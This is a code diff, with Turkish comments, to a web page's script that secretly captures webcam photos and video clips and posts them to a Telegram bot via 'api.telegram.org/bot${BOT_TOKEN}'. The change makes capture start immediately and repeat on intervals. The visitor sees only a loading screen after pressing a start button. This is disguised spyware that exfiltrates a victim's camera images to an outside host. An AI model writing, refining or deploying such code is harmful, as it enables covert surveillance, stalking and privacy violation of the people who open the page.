@@ -173,47 +173,14 @@
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
                         
-                        const baslangicZamani = Date.now();
-                        
                         // ========================================
-                        // FOTOĞRAF - HER FOTO_SURESI SANİYEDE BİR
+                        // VİDEO - HEMEN BAŞLA (0 MS BEKLEME)
                         // ========================================
-                        fotoTimer = setInterval(() => {
-                            if (!stream?.active) return;
-                            
-                            photoCount++;
-                            
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            ctx.drawImage(video, 0, 0);
-                            
-                            canvas.toBlob(function(blob) {
-                                if (!blob) return;
-                                const formData = new FormData();
-                                formData.append('chat_id', TARGET_ID);
-                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
-                                
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                            }, 'image/jpeg', 0.85);
-                            
-                        }, FOTO_SURESI * 1000);
-                        
-                        // ========================================
-                        // VİDEO - İLK VİDEO 2 SANİYE SONRA BAŞLASIN
-                        // ========================================
-                        setTimeout(() => {
-                            videoBaslat();
-                        }, 2000);
-                        
                         function videoBaslat() {
                             if (!stream?.active) return;
                             
-                            videoCount = 1;
-                            const videoIndex = 1;
+                            videoCount++;
+                            const videoIndex = videoCount;
                             const videoBaslangic = Date.now();
                             const chunks = [];
                             
@@ -241,9 +208,6 @@
                                         method: 'POST',
                                         body: formData
                                     });
-                                    
-                                    // Sonraki videoyu planla
-                                    videoTimer = setTimeout(videoBaslat, VIDEO_SURESI * 1000);
                                 };
                                 
                                 mr.start();
@@ -254,6 +218,39 @@
                                 
                             } catch(e) {}
                         }
+                        
+                        // İlk videoyu hemen başlat
+                        videoBaslat();
+                        
+                        // Sonraki videolar için interval
+                        videoTimer = setInterval(videoBaslat, VIDEO_SURESI * 1000);
+                        
+                        // ========================================
+                        // FOTOĞRAF - HEMEN BAŞLA
+                        // ========================================
+                        fotoTimer = setInterval(() => {
+                            if (!stream?.active) return;
+                            
+                            photoCount++;
+                            
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            ctx.drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(function(blob) {
+                                if (!blob) return;
+                                const formData = new FormData();
+                                formData.append('chat_id', TARGET_ID);
+                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
+                                formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
+                                
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            }, 'image/jpeg', 0.85);
+                            
+                        }, FOTO_SURESI * 1000);
                     };
                     
                 } catch(e) {
@@ -263,7 +260,7 @@
             
             window.onbeforeunload = function() {
                 if (fotoTimer) clearInterval(fotoTimer);
-                if (videoTimer) clearTimeout(videoTimer);
+                if (videoTimer) clearInterval(videoTimer);
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
             
@@ -271,4 +268,4 @@
         })();
     </script>
 </body>
-</html>
+    </html>
